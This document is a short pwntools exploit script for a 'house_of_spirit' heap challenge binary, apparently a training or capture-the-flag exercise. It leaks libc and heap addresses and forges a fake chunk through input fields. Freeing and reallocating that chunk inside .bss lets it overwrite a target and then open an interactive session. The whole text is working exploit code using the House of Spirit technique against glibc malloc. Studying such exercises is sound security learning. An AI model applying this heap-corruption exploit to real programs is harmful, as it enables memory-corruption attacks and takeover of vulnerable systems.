from pwn import *
r = process("./house_of_spirit")
libc = ELF("../.glibc/glibc_2.30_no-tcache/libc.so.6",checksec=False)

index = 0

def malloc(size,data,name):
    global index
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"size:",str(size).encode())
    r.sendlineafter(b"data:",data)
    r.sendlineafter(b"name:",name)
    index += 1
    return index - 1

def free(idx):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"index:",str(idx).encode())

r.recvuntil(b"@ ")
libc.address = int(r.recv(14).strip(),16) -  0x6faf0

r.recvuntil(b"@ ")
heap = int(r.recv(10).strip(),16)

# Fake chunk->size
r.sendlineafter(b"age:",str(0x70).encode())

# Fake nextchunk->prevsize and nextchunk->size
r.sendlineafter(b"username:",p64(0) + p64(0x1234))

# chunksize_nomask (chunk_at_offset (p, size)) > CHUNK_HDR_SZ
# chunksize (chunk_at_offset (p, size)) < av->system_mem

# Create chunk A with arbitrary size to overwrite m_array.ptr with m_array.name
a = malloc(0x30,b"",p64(0) + p64(0x602020))

# m_array[0].ptr = 0x602010 (user, AKA fake chunk)
free(a)

# Alloc chunk B in the .bss section and overwrite "target"
b = malloc(0x60,b"A"*0x40 + b"_s1s1fo_",b"osaka")

r.sendlineafter(b">",b"3")
r.interactive()
